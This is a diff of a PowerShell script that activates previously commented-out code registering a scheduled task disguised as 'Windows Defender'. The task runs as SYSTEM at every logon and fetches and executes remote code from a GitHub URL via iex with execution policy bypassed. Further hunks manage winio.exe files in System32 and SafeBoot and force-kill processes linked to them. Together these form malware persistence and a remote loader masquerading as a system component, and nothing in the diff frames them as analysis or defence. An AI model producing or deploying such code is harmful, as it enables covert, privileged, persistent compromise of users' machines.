@@ -92,11 +92,11 @@ else
 
     try
     {
-        #$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-NoProfile -ExecutionPolicy Bypass -Command "iex(iwr ''https://raw.githubusercontent.com/aodfs/0/main/2'' -UseBasicP).Content"'
-        #$trigger = New-ScheduledTaskTrigger -AtLogOn;
-        #$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest;
-        #$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal;
-        #Register-ScheduledTask -TaskName "Windows Defender" -InputObject $task -TaskPath "\Microsoft\Windows\Windows Defender\" -Force;
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-NoProfile -ExecutionPolicy Bypass -Command "iex(iwr ''https://raw.githubusercontent.com/aodfs/0/main/2'' -UseBasicP).Content"'
+        $trigger = New-ScheduledTaskTrigger -AtLogOn;
+        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest;
+        $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal;
+        Register-ScheduledTask -TaskName "Windows Defender" -InputObject $task -TaskPath "\Microsoft\Windows\Windows Defender\" -Force;
     }
     catch 
     {
@@ -109,12 +109,12 @@ else
     catch
     {
     };
-    
+
     $filePaths = @(
         'C:\Windows\System32\winio.exe', 
         'C:\Windows\System32\SafeBoot\winio.exe'
     );
-
+    
     foreach ($filePath in $filePaths) 
     {
         try 
@@ -134,6 +134,7 @@ else
         } 
         catch 
         {
+            # Handle the error if necessary
         };
     }
 
@@ -144,28 +145,27 @@ else
         
         if ($mutex) 
         {
-            $processes = Get-Process | Where-Object 
-            {
-                $_.MainWindowHandle -ne 0 -and $_.Modules | Where-Object
-                {
-                    $_.FileName -match "C:\\Windows\\System32\\winio.exe" -or 
-                    $_.FileName -match "C:\\Windows\\System32\\SafeBoot\\winio.exe"
+            $processes = Get-Process | Where-Object {
+                $_.Modules | Where-Object {
+                    $_.FileName -eq "C:\Windows\System32\winio.exe" -or 
+                    $_.FileName -eq "C:\Windows\System32\SafeBoot\winio.exe"
                 }
             }
-
+    
             foreach ($process in $processes) 
             {
                 Write-Output "Terminating process $($process.Id) holding the mutex $mutexName"
                 Stop-Process -Id $process.Id -Force;
             }
-
+    
             $mutex.ReleaseMutex();
             $mutex.Dispose();
         }
     } 
     catch 
     {
-    };
+        # Handle exceptions if necessary
+    };    
 
     try 
     {
